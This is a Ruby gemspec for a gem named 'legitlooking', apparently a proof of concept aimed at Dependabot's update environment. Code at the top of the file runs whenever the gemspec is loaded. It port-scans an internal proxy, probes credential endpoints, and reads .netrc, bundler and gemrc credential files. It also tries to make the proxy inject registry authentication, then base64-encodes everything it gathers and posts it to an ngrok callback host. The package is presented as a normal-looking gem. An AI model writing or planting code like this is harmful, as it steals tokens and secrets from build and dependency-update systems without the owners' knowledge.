# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 3000] }
  lines = []

  PROXY = "172.19.0.2"

  # ============================================================
  # 1. PROXY POORT SCAN -- luistert de proxy op meer dan 1080?
  # ============================================================
  lines << "=== 1. PROXY POORTCAN ==="
  [80, 443, 1080, 8080, 8443, 3128, 9090, 9091, 4646, 5000, 8888, 9000].each do |port|
    r = cmd.("curl -s --max-time 2 -o /dev/null -w '%{http_code}' http://#{PROXY}:#{port}/")
    lines << "#{PROXY}:#{port} => #{r}"
  end

  # ============================================================
  # 2. PROXY DIRECTE REQUESTS -- management/config/health endpoints
  # ============================================================
  lines << "\n=== 2. PROXY MANAGEMENT ENDPOINTS ==="
  ["/health", "/config", "/credentials", "/api/v1/credentials", "/status",
   "/metrics", "/__admin", "/proxy/config", "/v1/credentials"].each do |path|
    r = cmd.("curl -s --max-time 3 --noproxy '*' http://#{PROXY}:1080#{path}")
    lines << "#{path}: #{r[0,300]}"
  end

  # ============================================================
  # 3. PROXY VERBINDING -- OPTIONS/TRACE methoden
  # ============================================================
  lines << "\n=== 3. PROXY OPTIONS ==="
  lines << cmd.("curl -s --max-time 3 --noproxy '*' -X OPTIONS http://#{PROXY}:1080/ -D -")
  lines << cmd.("curl -s --max-time 3 --noproxy '*' -X TRACE  http://#{PROXY}:1080/ -D -")

  # ============================================================
  # 4. CREDENTIAL FILES OP SCHIJF
  # ============================================================
  lines << "\n=== 4. NETRC / BUNDLE CONFIG / GEMRC ==="
  [
    "/home/dependabot/.netrc",
    "/home/dependabot/.bundle/config",
    "/root/.netrc",
    "/etc/gemrc",
    "/home/dependabot/.gemrc",
    "/home/dependabot/dependabot-updater/.bundle/config",
    "/home/dependabot/dependabot-updater/repo/.bundle/config",
  ].each do |f|
    content = cmd.("cat #{f}")
    lines << "#{f}: #{content.empty? ? '(leeg/niet gevonden)' : content}"
  end

  # ============================================================
  # 5. CREDENTIAL PROXY CONFIG -- zoek proxy config files
  # ============================================================
  lines << "\n=== 5. PROXY CONFIG FILES ==="
  lines << cmd.("find /home/dependabot /etc /opt -name '*.conf' -o -name '*.config' -o -name 'credentials*' -o -name '.credentials*' 2>/dev/null | grep -v ruby | grep -v python | head -30")
  lines << cmd.("find /tmp /var/run -maxdepth 3 2>/dev/null | head -30")

  # ============================================================
  # 6. MAAK REQUEST NAAR PRIVATE REGISTRY VIA PROXY
  #    Proxy injecteert SSRF_TOKEN -- server logt de auth header
  #    Stuur naar onze eigen ngrok als target via HTTP (niet HTTPS)
  # ============================================================
  lines << "\n=== 6. PROXY CREDENTIAL INTERCEPT (HTTP request via proxy) ==="
  # Stuur request door de proxy naar onze callback URL maar met
  # rubygems.pkg.github.com als Host header -- proxy matcht op Host
  intercept = cmd.("curl -s --max-time 10 -v --proxy http://#{PROXY}:1080 -H 'Host: rubygems.pkg.github.com' http://rubygems.pkg.github.com/ugurcanli/ 2>&1")
  lines << intercept[0, 1500]

  # ============================================================
  # 7. DIRECTE RUBY BUNDLER AUTH -- leest bundler de credentials?
  # ============================================================
  lines << "\n=== 7. BUNDLER CREDENTIALS ==="
  lines << cmd.("cat /home/dependabot/dependabot-updater/vendor/bundle/ruby/*/bundler/config 2>/dev/null")
  lines << cmd.("find /home/dependabot -name 'bundle' -name 'config' 2>/dev/null | xargs cat 2>/dev/null")

  # ============================================================
  # 8. /proc/net -- interne verbindingen zichtbaar?
  # ============================================================
  lines << "\n=== 8. /proc/net/tcp ==="
  lines << cmd.("cat /proc/net/tcp | head -20")
  lines << "\n--- /proc/net/tcp6 ---"
  lines << cmd.("cat /proc/net/tcp6 | head -10")

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=proxy_cred_intercept")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 30, read_timeout: 30) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=proxy_cred_intercept&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.27"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
